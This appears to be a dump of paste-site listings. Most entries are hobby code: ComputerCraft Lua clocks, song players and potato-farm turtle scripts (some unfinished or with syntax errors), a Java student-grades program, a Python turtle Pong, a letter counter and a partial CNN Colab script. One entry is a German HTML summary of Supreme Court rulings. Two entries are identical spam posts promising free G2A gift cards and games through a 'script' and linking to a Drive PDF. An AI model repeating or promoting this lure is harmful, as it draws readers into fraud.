3wXTYMuS,Real Life Clock Scaled [6x3] Monitor,MigasRocha,Lua,Thursday 27th of June 2024 07:03:18 PM CDT,"-- Step 1: Wrap the monitor peripheral
local side = ""left""  -- Replace with the side the monitor is attached to
local monitor = peripheral.wrap(side)

-- Check if the monitor is wrapped successfully
if not monitor then
    print(""Error: No monitor found on the specified side: "" .. side)
    return
end

-- Set text scale and redirection
monitor.setTextScale(4)  -- Adjust text scale as needed
term.redirect(monitor)

-- Function to get the current time as a table
local function getRealTime()
    local time = os.date(""*t"")
    return {hour = time.hour, min = time.min}
end

-- Function to display the time centered on the monitor
local function displayTime()
    local currentTime = getRealTime()
    local monitorWidth, monitorHeight = monitor.getSize()
    local text = string.format(""%02d:%02d"", currentTime.hour, currentTime.min)
    local textWidth = #text * 1  -- Multiply by text scale (4) to get effective width
    local xPos = math.floor((monitorWidth - textWidth) / 2) + 1
    local yPos = math.floor(monitorHeight / 1.6 )
    
    monitor.clear()
    monitor.setCursorPos(xPos, yPos)
    monitor.setTextColor(colors.orange)
    monitor.write(text)
    monitor.setCursorPos(4,1)
    monitor.setTextColor(colors.red)
    monitor.write(""Real Time"")
end


    




-- Main loop to continuously update and display the time
while true do
    displayTime()
    sleep(1)  -- Update the time every second
end
"
Uz7Kz0Jh,"SongPlayer ""Multiple Parts"" [UNFINISHED]",MigasRocha,Lua,Thursday 27th of June 2024 07:00:59 PM CDT,"
local speakerSide = ""right"" 

local fileName = ""music.dfpwm""
local file = fs.open(fileName, ""rb"") 

if not file then
    print(""Failed to open "" .. fileName)
    return
end


local fileSize = fs.getSize(fileName)


if not peripheral.isPresent(speakerSide) then
    print(""No peripheral found on side "" .. speakerSide)
    file.close()
    return
end


local speaker = peripheral.wrap(speakerSide)

if type(speaker) ~= ""table"" or not speaker.playAudio then
    print(""Peripheral on side "" .. speakerSide .. "" is not a valid speaker"")
    file.close()
    return
end


local dfpwm = require(""cc.audio.dfpwm"").make_decoder()


local chunkSize = 16 * 1024 -- 16 KB


local function streamAndPlayAudio()
    local totalBytesRead = 0
    
    while true do
        local chunk = file.read(chunkSize)
        if not chunk then
            break
        end
        
        local decodedChunk = dfpwm(chunk)
        speaker.playAudio(decodedChunk)
        

        totalBytesRead = totalBytesRead + #chunk
        
     
        local progress = math.floor(totalBytesRead / fileSize * 100)
        
       
        term.clearLine()
        term.setCursorPos(1, 1)
        
        
        io.write(""Progress: ["" .. string.rep(""#"", progress) .. string.rep(""-"", 100 - progress) .. ""] "" .. progress .. ""%"")
        
        
        sleep(2.3) 
    end
    
    
    print()
end


print(""Streaming and playing song..."")
streamAndPlayAudio()


file.close()
"
Ebdt8r4A,"SongPlayer ""WiredSpeakers""",MigasRocha,Lua,Thursday 27th of June 2024 06:59:02 PM CDT,"--Check pelo musica na memoria do computer
local dfpwmFileName = ""Daisuki.dfpwm""  -- ""TEMPORARIO"" alterar o nome com a musica

local dfpwmFile = fs.open(dfpwmFileName, ""rb"")
if not dfpwmFile then
    print(""Failed to open "" .. dfpwmFileName)
    return
end
print(""Opened file "" .. dfpwmFileName)

-- Dar wrap nos pelos modems
local function findSpeakers()
    local speakers = {}
    local modemSide = ""top""

    -- Encontrar Peripherals Connectados no Modem
    local modem = peripheral.wrap(modemSide)
    if not modem then
        print(""No modem found on side "" .. modemSide)
        return nil
    end
    print(""Modem found on side "" .. modemSide)
    
    -- Procurar Speakers na rede de wires
    local connectedPeripherals = modem.getNamesRemote()
    for _, peripheralName in ipairs(connectedPeripherals) do
        local speaker = peripheral.wrap(peripheralName)
        if speaker and type(speaker) == ""table"" and speaker.playAudio then
            table.insert(speakers, speaker)
            print(""Found valid speaker: "" .. peripheralName)
        else
            print(""Found invalid peripheral: "" .. peripheralName)
        end
    end

    return speakers
end

local speakers = findSpeakers()
if #speakers == 0 then
    print(""No valid speakers found connected through wired modems."")
    dfpwmFile.close()
    return
end
print(""Found "" .. #speakers .. "" valid speakers"")

-- Decoder
local dfpwm = require(""cc.audio.dfpwm"").make_decoder()

-- Tamanho do chunk que le de cada vez
local chunkSize = 16 * 1024  -- 16 KB

-- Fun√ßao para Streamar o audio
local function streamAndPlayAudio()
    local totalBytesRead = 0
    while true do
        local chunk = dfpwmFile.read(chunkSize)
        if not chunk then
            break
        end

        local decodedChunk = dfpwm(chunk)
        
        -- Audio pelos speakers
        for _, speaker in ipairs(speakers) do
            local success, err = pcall(function() speaker.playAudio(decodedChunk) end)
            if not success then
                print(""Error playing audio on speaker: "" .. err)
            end
        end
        
        -- Ajustar o timing da musica ""2.3 normalmente"" ""IMPORTANTE"" aumentar para tirar skip diminuir para tirar cortes
        sleep(2.3) 
        


        ---Debug Remover Depois
        totalBytesRead = totalBytesRead + #chunk
        --print(""Total bytes read: "" .. totalBytesRead)
    end
end

-- Come√ßar A musica
print(""Streaming and playing audio from"",dfpwmFileName,""through wired modems..."")
streamAndPlayAudio()

-- Fechar o ficheiro
dfpwmFile.close()
print(""Audio playback completed"")
"
SsEjehpx,Aluno.java,RogerioSouza,Java,Thursday 27th of June 2024 06:54:12 PM CDT,"package br.senac.df.curso.desafio.modelo;

import java.util.ArrayList;

public class Aluno {
    private String nome;
    private ArrayList<Double> notas = new ArrayList<>();

    public Aluno(String nome){
        this.nome = nome;
    }

    public void adicionarNota(double nota){
        notas.add(nota);
    }


    public double getMedia(){
        double somaTotal = 0;
        for (int contador = 0; contador < notas.size(); contador++) {
            somaTotal += notas.get(contador);
        }
        return somaTotal/notas.size();
    }



    public String getNome() {
        return nome;
    }

    public void setNome(String nome) {
        this.nome = nome;
    }

    public ArrayList<Double> getNotas() {
        return notas;
    }


    @Override
    public  String toString(){
        return  this.nome;
    }

}
"
28LYYp4c,ControleDeAlunosMain.java,RogerioSouza,Java,Thursday 27th of June 2024 06:53:30 PM CDT,"import br.senac.df.curso.desafio.modelo.Aluno;

import java.util.ArrayList;
import java.util.Scanner;

public class ControleDeAlunosMain {
    public static void main(String[] args) {

        ArrayList<Aluno> alunos = new ArrayList<>();



        String menu = """"""
                     Digite a op√ß√£o desejada:
                     1 - Adicionar Aluno
                     2 - Calcular a M√©dia
                     3 - Remover Aluno
                     4 - Listar Alunos
                     5 - Exibir Aluno com Maior Media
                     6 - Sair
                """""";

        while(true){
            int opcao = (int) capturaNumeroDoTeclado(menu);

            switch (opcao)
            {
                case 1: //Adicionar Aluno
                    String nomeDoNovoAluno = capturaStringDoTeclado(""Digite o nome do Aluno: "");
                    Aluno  novoAluno = new Aluno(nomeDoNovoAluno);

                    atribuirNovaNota(novoAluno);
                    atribuirNovaNota(novoAluno);
                    atribuirNovaNota(novoAluno);

                    alunos.add(novoAluno);

                break;
                case 2: //Calcular a M√©dia
                    System.out.println(""Listando Alunos e suas m√©dias"");
                    for(int indice =0; indice<alunos.size(); indice++){
                        Aluno alunoDaLista = alunos.get(indice);
                        System.out.println(alunoDaLista.getNome()+"" ""+alunoDaLista.getMedia());
                    }
                    break;
                case 3: //Remover Aluno
                    String nomeDoAlunoParaRemover = capturaStringDoTeclado(""Informe o nome do Aluno para remov√™-lo: "");
                    int posicaoDoAlunoNalista = -1;

                    for(int indice =0; indice < alunos.size(); indice++){
                        Aluno alunoDaLista = alunos.get(indice);
                        if(nomeDoAlunoParaRemover.equals(alunoDaLista.getNome())){
                            posicaoDoAlunoNalista = indice;
                            break;
                        }
                    }
                    alunos.remove(posicaoDoAlunoNalista);
                    System.out.println(""Aluno Removido"");
                    break;
                case 4: //Listar Alunos
                    System.out.println(alunos);
                break;
                case 5: //Exibir Aluno com Maior Media
                    double maiorMedia = 0;
                    Aluno alunoComMaiorMedia = null;
                    for(int indice =0; indice<alunos.size(); indice++){
                        Aluno alunoDaLista = alunos.get(indice);
                        if(alunoDaLista.getMedia() > maiorMedia){
                            maiorMedia = alunoDaLista.getMedia();
                            alunoComMaiorMedia = alunoDaLista;
                        }
                    }
                    System.out.println(""Aluno com maior m√©dia: ""+alunoComMaiorMedia.getNome());
                break;

                case 6: //Sair
                    System.out.println(""Sistema Encerrado"");
                    System.exit(0);
                default:
                    System.out.println(""Op√ß√£o Inv√°lida"");
                    break;
            }

        }
    }

    public  static void atribuirNovaNota(Aluno aluno){
        double nota = capturaNumeroDoTeclado(""Informe a nota do aluno: "");
        aluno.adicionarNota(nota);
    }



    public static double capturaNumeroDoTeclado(String prompt){
        System.out.print(prompt);
        Scanner entrada = new Scanner(System.in);
        if(entrada.hasNextLine()){
            entrada.hasNextLine();
        }
        return  entrada.nextDouble();
    }

    public static String capturaStringDoTeclado(String prompt){
        System.out.print(prompt);
        Scanner entrada = new Scanner(System.in);
        if(entrada.hasNextLine()){
            entrada.hasNextLine();
        }
        return  entrada.nextLine();
    }

}
"
m5BghQ0Q,Python - Turtle - Pong - (Stackoverflow),furas,Python,Thursday 27th of June 2024 06:51:47 PM CDT,"#!/usr/bin/env python3

""""""
# date: 2024.06.28
# [Second instance of a class suppresses/deletes the first one in my Python program - Stack Overflow](https://stackoverflow.com/questions/78677249/second-instance-of-a-class-suppresses-deletes-the-first-one-in-my-python-program?noredirect=1#comment138718516_78677249)
""""""

from turtle import Turtle
from turtle import Screen

# --- constants ---  # PEP8: `UPPER_CASE_NAMES`

# BOX = 30

# --- classes ---  

class Paddle:

    def __init__(self, side, key_left, key_right, x, color):
    
        self.key_left = key_left
        self.key_right = key_right

        self.paddle = Turtle(shape=""square"")
        self.paddle.color(color)
        self.paddle.penup()
        self.paddle.setx(x)
        self.paddle.sety(0)

        self.pressed_up = False
        self.pressed_down = False
        
        self.paddle.screen.onkeypress(key=self.key_left,  fun=self.move_up)
        self.paddle.screen.onkeypress(key=self.key_right, fun=self.move_down)

        self.paddle.screen.onkeyrelease(key=self.key_left,  fun=self.move_up_stop)
        self.paddle.screen.onkeyrelease(key=self.key_right, fun=self.move_down_stop)

        half_height = screen.canvheight // 2
        
        self.range_top    =  half_height - 10
        self.range_bottom = -half_height + 10
        #print('[DEBUG]', self.range_top, self.range_bottom)

        self.speed = 0
        
    def update(self):
        
        if self.pressed_up and self.pressed_down:  # both keys are presse then don't move
            self.speed = 0
        elif self.pressed_up:    # only one is pressed
            self.speed = 5  
        elif self.pressed_down:  # only one is pressed
            self.speed = -5
        else:  # both keys are unpressed
            self.speed = 0
    
        if self.speed != 0:
            current_y = self.paddle.ycor()
            new_y = current_y + self.speed
            
            if self.range_top > new_y > self.range_bottom:
                self.paddle.sety(new_y)

    # I don't do calculation here (and don't execute `update()` 
    # because key repeates presses slow and it slows all movement
    def move_up(self):
        self.pressed_up = True

    def move_down(self):
        self.pressed_down = True

    def move_up_stop(self):
        self.pressed_up = False

    def move_down_stop(self):
        self.pressed_down = False

class Ball:

    def __init__(self, x=0, y=0, color='black'):
        self.ball = Turtle(shape=""square"")
        self.ball.color(color)
        self.ball.penup()
        self.ball.setx(x)
        self.ball.sety(y)
        self.speed_x = 3
        self.speed_y = 3
        
        half_width = screen.canvwidth // 2
        half_height = screen.canvheight // 2
        
        self.range_top    =  half_height - 10
        self.range_bottom = -half_height + 10
        self.range_left   =  half_width - 10
        self.range_right  = -half_width + 10
        
    def update(self):
        current_x = self.ball.xcor()
        current_y = self.ball.ycor()
        new_x = current_x + self.speed_x
        new_y = current_y + self.speed_y
        
        if new_x < self.range_right or new_x > self.range_left:
            self.speed_x = -self.speed_x
        if new_y > self.range_top   or new_y < self.range_bottom:
            self.speed_y = -self.speed_y
        
        self.ball.setx(new_x)
        self.ball.sety(new_y)
        
# --- functions ----

def mainloop():
    left_pad.update()
    right_pad.update()
    ball.update()
    
    screen.update()

    # update after ? ms
    screen.ontimer(mainloop, 5)

# --- main ---

screen = Screen()
screen.bgcolor(""beige"")
screen.title(""Pong!"")
screen.setup(width=820, height=620)
screen.screensize(canvwidth=800, canvheight=600)
screen.tracer(0)
screen.listen()

half_width = screen.canvwidth // 2

x = -half_width + 20
left_pad  = Paddle(""left"", ""w"", ""s"", x, 'red')

x =  half_width - 20
right_pad = Paddle(""right"", ""Up"", ""Down"", x, 'green')

ball = Ball()

mainloop()

screen.exitonclick()
"
RvsxyeWY,Supreme Court Decision Summary,worstbull,HTML,Thursday 27th of June 2024 06:19:55 PM CDT,"<!DOCTYPE html>
<html lang=""de"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Supreme Court Decision Summary</title>
</head>
<body>
    <h1>Zusammenfassung des Videos ""Supreme Court DROPS BOMBSHELL Decision at KEY MOMENT""</h1>
    <p>Das Video ""Supreme Court DROPS BOMBSHELL Decision at KEY MOMENT"" von MeidasTouch behandelt drei wichtige Entscheidungen des US Supreme Court, die erhebliche Auswirkungen auf das Land und unser Leben haben. Im Folgenden eine detaillierte Zusammenfassung der Inhalte:</p>

    <h2>1. SEC vs. Jarkesy</h2>
    <ul>
        <li>Das Gericht entschied mit einer 6:3-Mehrheit, dass Angeklagte, gegen die die SEC zivilrechtliche Strafen verh√§ngt, Anspruch auf ein Geschworenenverfahren vor einem Bundesgericht haben.</li>
        <li>Diese Entscheidung wird weitreichende Auswirkungen auf andere Beh√∂rden und deren F√§higkeit haben, zivilrechtliche Strafen zu verh√§ngen.</li>
        <li>Diese Entscheidung ist Teil eines gr√∂√üeren Projekts, das die ""Deconstruction of the Administrative State"" zum Ziel hat, unterst√ºtzt von rechtsgerichteten Geldgebern. Ziel ist es, sicherzustellen, dass die Bundesregierung unter demokratischen Verwaltungen keine Industrien regulieren kann.</li>
    </ul>

    <h2>2. Ohio vs. EPA</h2>
    <ul>
        <li>Mit einer knappen 5:4-Mehrheit blockierte das Gericht die ""Good Neighbor Rule"" der EPA, die die Ozonemissionen von aufwindigen Staaten einschr√§nkt.</li>
        <li>Interessanterweise stimmte Amy Coney Barrett mit den von Demokraten ernannten Richtern √ºberein und zeigte Bedenken gegen den Einsatz des sogenannten ""Shadow Docket"" f√ºr Notfallentscheidungen ohne vollst√§ndige √úberpr√ºfung.</li>
    </ul>

    <h2>3. MO vs. US (Abtreibungsfall aus Idaho)</h2>
    <ul>
        <li>Das Gericht entschied, dass Krankenh√§user in Idaho, die Bundesmittel erhalten, verpflichtet sind, Notfallabtreibungen zur Gesundheitsstabilisierung durchzuf√ºhren, trotz des Abtreibungsverbots in Idaho.</li>
        <li>Diese Entscheidung stellt einen Konflikt zwischen Bundesgesetz und staatlichen Abtreibungsverboten dar. Die Richter Roberts, Barrett und Kavanaugh suchten nach Wegen, die Bundes- und Landesgesetze in Einklang zu bringen, um politische Kontroversen w√§hrend der Wahlzeit zu vermeiden.</li>
    </ul>

    <h2>Detaillierte Analyse</h2>

    <h3>SEC vs. Jarkesy</h3>
    <ul>
        <li>Die Entscheidung basiert auf dem siebten Verfassungszusatz, der das Recht auf ein Geschworenenverfahren garantiert. Dies erschwert es der SEC und anderen Beh√∂rden, zivilrechtliche Strafen zu verh√§ngen, da sie nun Juryprozesse durchf√ºhren m√ºssen, was mehr Ressourcen erfordert.</li>
        <li>Langfristig k√∂nnte dies die Durchsetzungsf√§higkeit vieler Regulierungsbeh√∂rden schw√§chen, da ihnen die Mittel fehlen, umfassende Gerichtsverfahren durchzuf√ºhren.</li>
    </ul>

    <h3>Ohio vs. EPA</h3>
    <ul>
        <li>Die Entscheidung wurde kritisiert, da sie es verschmutzenden Staaten erm√∂glicht, sch√§dliche Emissionen in benachbarte Staaten zu √ºbertragen, was die Umweltbelastung erh√∂ht.</li>
        <li>Amy Coney Barretts Einw√§nde gegen den Einsatz des Shadow Docket reflektieren ihre Bedenken bez√ºglich der Legitimit√§t und Transparenz solcher Notfallentscheidungen.</li>
    </ul>

    <h3>MO vs. US</h3>
    <ul>
        <li>Der Fall dreht sich um den Konflikt zwischen Bundesanforderungen an die Notfallversorgung und strikten staatlichen Abtreibungsverboten.</li>
        <li>Die Entscheidung des Gerichts, den Fall nicht weiter zu behandeln, l√§sst die Bundesvorschriften zur Gesundheitsstabilisierung bestehen und untergr√§bt das staatliche Abtreibungsverbot in Idaho.</li>
    </ul>

    <p>Zusammengefasst zeigt das Video, wie der Supreme Court durch strategische Entscheidungen die Macht und Effektivit√§t von Regulierungsbeh√∂rden untergr√§bt, Umweltvorschriften lockert und den Zugang zu Gesundheitsdienstleistungen beeinflusst. Die Diskussion betont die politischen und ideologischen Hintergr√ºnde dieser Entscheidungen und deren potenziell weitreichende Auswirkungen auf die US-amerikanische Gesellschaft.</p>
</body>
</html>
"
JC91DpyP,ü§ë G2A.COM FREE GIFT CARD GUIDE JUN 2024 V5 ü§ë,x2w,GetText,Thursday 27th of June 2024 06:00:03 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
28 June 2024

"
ZumP5y01,potato,Harlaquin,Lua,Thursday 27th of June 2024 05:31:23 PM CDT,"--  Potato Farm Code
--  

southwest = {187, 66, 267}
sourtheast = {195, 66, 267}
northwest = {187, 66, 259}
northeast = {195, 66, 259}

fuelChest = {194, 66, 268}
storageChest = {188, 66, 268}
slotCount = 16

--  Returns for 'itemName' slot in inventory
function getItemIndex(itemName)
    for slot = 1, 16, 1 do
        item = turtle.getItemDetail(slot)
        if(item ~= nil) then
            if(item[""name""] == itemName) then
                return slot
            end
        end
    end
end


function checkFuel()
    turtle.select(1)
 
    if(turtle.getFuelLevel() < 50) then
        print(""Attempting Refuel..."")
        for slot = 1, slotCount, 1 do
            turtle.select(slot)
            if(turtle.refuel(1)) then
                return true
            end
        end

        return false
    else
        return true
    end
end


function getFuel()
    
end


-- returns turtle distance compared to target location and counts fuel cost
function getDistance(currX, currY, currZ)
    cordX, cordY, cordZ = gps.locate()
    fuelCost = turtle.getFuelLevel()
    --effeicency variable -checks if travel is possible !!change later after troubleshooting
    efficiency = true

    compX = currX

    compared_set = {}

    return distance, efficency
end



--  actual command to move to a given destination
function moveTo(x, y, z)
    destination = {x, y, z}

    if destination~=gps.locate()
    then
        --  moveing to location based on 
    end
end


--  main fuction to have a never ending farm
--  !!northeast is a place holder for the last block in the calculated inputs
--  !! make sure code can move side to side in a 8x8 grid repeating the dig/plant action 
--  !! has to stay inside placed location
while(1) do


    
    -- checks turtle for fuel
    if checkFuel() then

        startCord = gps.locate()
        fuelstat = turtle.getFuelLevel()
        distan, efficiency_value = getDistance()

        --checks if given inputs are possible
        if(efficiency_value) then

            isBlock, data = turtle.inspectDown()
            if(isBlock) then
                if (data['state']['age'] <= 7)
                then
                    turtle.digDown()
                    potatoIndex = getItemIndex(""minecraft:potato"")
                    turtle.select(potatoIndex)
                    turtle.placeDown()
                else
                    potatoIndex = getItemIndex(""minecraft:potato"")
                    turtle.placeDown()
                end
            
            

            end   
        --  effeicency == false then returns to fuel chest or breaks    
        else
            print(""turtle has fuel, effeicency value = "" .. efficiency_value)
            startCord = gps.locate()
            moveTo(fuelChest)
            turtle.refuel()
            if turtle.checkFuel() then
                moveTo(startCord)
            else
                print(""Breaks Point: CheckFuel = "" .. checkFuel())
                os.exit()
            end
        end


    --  If turtle doesnt have fuel then it moves to chest, refuels, returns, then starts program from the top
    else 

        startCord = gps.locate()
        moveTo(fuelChest)
        turtle.refuel()
        if turtle.checkFuel() then
            moveTo(startCord)
        end
    end
end"
F3NhWxdd,Python-Strange response behavior in output,MariyanGrigorov,Python,Thursday 27th of June 2024 05:24:47 PM CDT,"strings = input().replace(' ', '')
count = {}

for string in strings:
    count[string] = count.get(string, 0) + 1
leather = '\n'.join({f'{letter} -> {num}' for letter, num in count.items()})
print(leather)

# input = text
# correct answer = t -> 2 e -> 1 x -> 1
# wrong answer 80 percent in case = e -> 1 x -> 1 t -> 2 
"
aDietkDd,potato,Harlaquin,Lua,Thursday 27th of June 2024 05:18:52 PM CDT,"--  Potato Farm Code
--  

southwest = {187, 66, 267}
sourtheast = {195, 66, 267}
northwest = {187, 66, 259}
northeast = {195, 66, 259}

fuelChest = {194, 66, 268}
storageChest = {188, 66, 268}
slotCount = 16

--  Returns for 'itemName' slot in inventory
function getItemIndex(itemName)
    for slot = 1, 16, 1 do
        item = turtle.getItemDetail(slot)
        if(item ~= nil) then
            if(item[""name""] == itemName) then
                return slot
            end
        end
    end
end


function checkFuel()
    turtle.select(1)
 
    if(turtle.getFuelLevel() < 50) then
        print(""Attempting Refuel..."")
        for slot = 1, slotCount, 1 do
            turtle.select(slot)
            if(turtle.refuel(1)) then
                return true
            end
        end

        return false
    else
        return true
    end
end


function getFuel()
    
end


-- returns turtle distance compared to target location and counts fuel cost
function getDistance(currX, currY, currZ)
    cordX, cordY, cordZ = gps.locate()
    fuelCost = turtle.getFuelLevel()
    --effeicency variable -checks if travel is possible !!change later after troubleshooting
    efficiency = true

    compX = currX

    compared_set = {}

    return distance, efficency
end



--  actual command to move to a given destination
function moveTo(x, y, z)
    destination = {x, y, z}

    if destination~=gps.locate()
    then
        --  moveing to location based on 
    end
end


--  main fuction to have a never ending farm
--  !!northeast is a place holder for the last block in the calculated inputs
--  !! make sure code can move side to side in a 8x8 grid repeating the dig/plant action 
--  !! has to stay inside placed location
while(1) do

    -- checks turtle for fuel
    if checkFuel()then

        startCord = gps.locate()
        fuelstat = turtle.getFuelLevel()
        distan, efficiency_value = getDistance()

        --checks if given inputs are possible
        if(efficiency_value) then

            isBlock, data = turtle.inspectDown()
            if(isBlock) then
                if (data['state']['age'] <= 7)
                then
                    turtle.digDown()
                    potatoIndex = getItemIndex(""minecraft:potato"")
                    turtle.select(potatoIndex)
                    turtle.placeDown()
                end
                else
                    potatoIndex = getItemIndex(""minecraft:potato"")
                    turtle.placeDown()
                end    
            
        end

    --  If turtle doesnt have fuel then it moves to chest, refuels, returns, then starts program from the top
    else 

        startCord = gps.locate()
        moveTo(fuelChest)
        turtle.refuel()
        if turtle.checkFuel() then
            moveTo(startCord)
        end
    end
end"
g2yL6TdS,potato,Harlaquin,Lua,Thursday 27th of June 2024 05:16:20 PM CDT,"--  Potato Farm Code
--  

southwest = {187, 66, 267}
sourtheast = {195, 66, 267}
northwest = {187, 66, 259}
northeast = {195, 66, 259}

fuelChest = {194, 66, 268}
storageChest = {188, 66, 268}
slotCount = 16

--  Returns for 'itemName' slot in inventory
function getItemIndex(itemName)
    for slot = 1, 16, 1 do
        item = turtle.getItemDetail(slot)
        if(item ~= nil) then
            if(item[""name""] == itemName) then
                return slot
            end
        end
    end
end


function checkFuel()
    turtle.select(1)
 
    if(turtle.getFuelLevel() < 50) then
        print(""Attempting Refuel..."")
        for slot = 1, slotCount, 1 do
            turtle.select(slot)
            if(turtle.refuel(1)) then
                return true
            end
        end

        return false
    else
        return true
    end
end


function getFuel()
    
end


-- returns turtle distance compared to target location and counts fuel cost
function getDistance(currX, currY, currZ)
    cordX, cordY, cordZ = gps.locate()
    fuelCost = turtle.getFuelLevel()
    --effeicency variable -checks if travel is possible !!change later after troubleshooting
    efficiency = true

    compX = currX -

    compared_set = {}

    return distance, efficency
end



--  actual command to move to a given destination
function moveTo(x, y, z)
    destination = {x, y, z}

    if destination~=gps.locate()
    then
        --  moveing to location based on 
    end
end


--  main fuction to have a never ending farm
--  !!northeast is a place holder for the last block in the calculated inputs
--  !! make sure code can move side to side in a 8x8 grid repeating the dig/plant action 
--  !! has to stay inside placed location
while(1) do

    -- checks turtle for fuel
    if checkFuel()then

        startCord = gps.locate()
        fuelstat = turtle.getFuelLevel()
        distan, efficiency_value = getDistance()

        --checks if given inputs are possible
        if(efficiency_value) then

            isBlock, data = turtle.inspectDown()
            if(isBlock) then
                if (data['state']['age'] <= 7)
                then
                    turtle.digDown()
                    potatoIndex = getItemIndex(""minecraft:potato"")
                    turtle.select(potatoIndex)
                    turtle.placeDown()
                end
                else
                    potatoIndex = getItemIndex(""minecraft:potato"")
                    turtle.placeDown()
                end    
            
        end

    --  If turtle doesnt have fuel then it moves to chest, refuels, returns, then starts program from the top
    else 

        startCord = gps.locate()
        moveTo(fuelChest)
        turtle.refuel()
        if turtle.checkFuel() then
            moveTo(startCord)
        end
    end
end"
PZcp5rjr,üéÅ G2A.COM FREE GIFT CARD GUIDE JUN 2024 V5 üéÅ,BitcoinScript2020,GetText,Thursday 27th of June 2024 05:10:20 PM CDT,"G2A.com free gift card & games updated guide,
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
28 June 2024"
8nDy8myH,nefukcni CNN cista 1.000,max2201111,Python,Thursday 27th of June 2024 05:09:49 PM CDT,"import numpy as np
import matplotlib.pyplot as plt
import tensorflow as tf
from tqdm.notebook import tqdm_notebook
from IPython.display import display, Javascript
from google.colab import files
import os
import shutil
import ast
from sklearn.metrics import confusion_matrix, accuracy_score, precision_score, recall_score, f1_score
import seaborn as sns
from skimage.transform import resize

display(Javascript('IPython.OutputArea.auto_scroll_threshold = 9999;'))

label_colors = {0: [0, 128, 0], 1: [255, 0, 0]}
label_colors_testing = {0: [0, 128, 0], 1: [255, 0, 0]}

%matplotlib inline

def create_image(data, predictions, label_colors):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)
    min_val = np.min(data)
    max_val = np.max(data)
    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [min_val, max_val], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)
        image[i, -1] = label_colors[predictions[i]]
    return image

def create_imageN(data, predictions, label_colors):
    num_training_rows = len(data)
    num_columns = len(data[0])
    image_training = np.zeros((num_training_rows, num_columns + 1, 3), dtype=np.uint8)
    min_val = np.min(data)
    max_val = np.max(data)
    for i in range(num_training_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [min_val, max_val], [0, 255]))
            image_training[i, j] = np.array([pixel_value] * 3)
        image_training[i, -1] = label_colors[int(predictions[i])]
    return image_training

def create_cnn_model(input_shape):
    model = tf.keras.Sequential([
        tf.keras.layers.InputLayer(input_shape=input_shape),
        tf.keras.layers.Conv2D(filters=32, kernel_size=(3, 3), activation='relu'),
        tf.keras.layers.MaxPooling2D(pool_size=(2, 2)),
        tf.keras.layers.Flatten(),
        tf.keras.layers.Dense(64, activation='relu'),
        tf.keras.layers.Dense(1, activation='sigmoid')
    ])
    model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])
    return model

def create_dnn_model(input_shape):
    model = tf.keras.Sequential([
        tf.keras.layers.Dense(128, activation='relu', input_shape=(input_shape,)),
        tf.keras.layers.Dense(64, activation='relu'),
        tf.keras.layers.Dense(1, activation='sigmoid')
    ])
    model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])
    return model

new_persons_results = [
    [0.030391238492519845, 0.23021081913032299, 0.4743575198860915, 0.639395348276238],
    [0.19790381537769108, 0.37639843860181527, 0.5676528538456297, 0.716530820399044],
    [0.0035245462826666075, 0.23127629815305784, 0.4802171123709532, 0.6591272725083992],
    [0.059230621364548486, 0.24424510845680134, 0.442553808602372, 0.6891856336835676],
    [0.05536813173866345, 0.2538888869331579, 0.47861285542743165, 0.6200559751500355],
    [0.1300359168058454, 0.38443677757577344, 0.5957238735056223, 0.795823160451845],
    [0.1743368240338569, 0.3713129035302336, 0.5640350202165867, 0.7213527928848786],
    [0.09173335232875372, 0.2559096689549753, 0.49527436563146954, 0.6970388573439903],
    [0.015235204378572087, 0.2284904031445293, 0.46613902406934005, 0.6917336579549159],
    [0.0011416656054787145, 0.24567669307188245, 0.4388400949432476, 0.667323193441009],
    [0.11776711, 0.17521301, 0.5074825, 0.8509191],
    [0.12314088, 0.27565651, 0.52214202, 0.77386896],
]


new_persons_results =[[1000],
[2000],
[3000],
[4000],
[5000],
[6000],
[7000],
[8000],
[9000],
[10000],
[11000],
[12000],
[13000],
[14000],
[15000],
[16000],
[17000],
[18000],
[19000],
[20000],
[21000],
[22000],
[23000],
[24000],
[25000],
]

uploaded = files.upload()
for filename in uploaded.keys():
    original_path = f""/content/{filename}""
    destination_path = os.path.join(""/content/"", ""DATA2"")
    shutil.move(original_path, destination_path)
    print(f""Soubor {filename} byl p≈ôesunut do {destination_path}"")

file_path = '/content/DATA2'
with open(file_path, 'r') as file:
    code = file.read()

A_list = ast.literal_eval(code)
A = np.array(A_list)

labels = [results[-1] for results in A]
data = [results[:-1] for results in A]

num_training_rows = 10
num_testing_rows = 25

X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]

mean_values = np.mean(X_train, axis=0)
std_values = np.std(X_train, axis=0)
X_train_normalized = (X_train - mean_values) / std_values
X_test_normalized = (X_test - mean_values) / std_values

# Verify normalization
print(""Mean of X_train_normalized (should be close to 0):"", np.mean(X_train_normalized, axis=0))
print(""Std of X_train_normalized (should be close to 1):"", np.std(X_train_normalized, axis=0))

# Generate images from normalized data for CNN
image_training = create_imageN(X_train_normalized, y_train, label_colors)
image_testing = create_imageN(X_test_normalized, y_test, label_colors_testing)

# Resize images to a fixed size for CNN input
image_training_resized = [resize(img[:, :-1], (100, 100, 3)) for img in image_training]
image_testing_resized = [resize(img[:, :-1], (100, 100, 3)) for img in image_testing]

# Check image shapes
print(f""Shape of image_training_resized[0]: {image_training_resized[0].shape}"")
print(f""Shape of image_testing_resized[0]: {image_testing_resized[0].shape}"")

# Reshape images for CNN
X_train_cnn = np.array(image_training_resized)
X_test_cnn = np.array(image_testing_resized)

mean_train_cnn = np.mean(X_train_cnn, axis=(0, 1, 2))
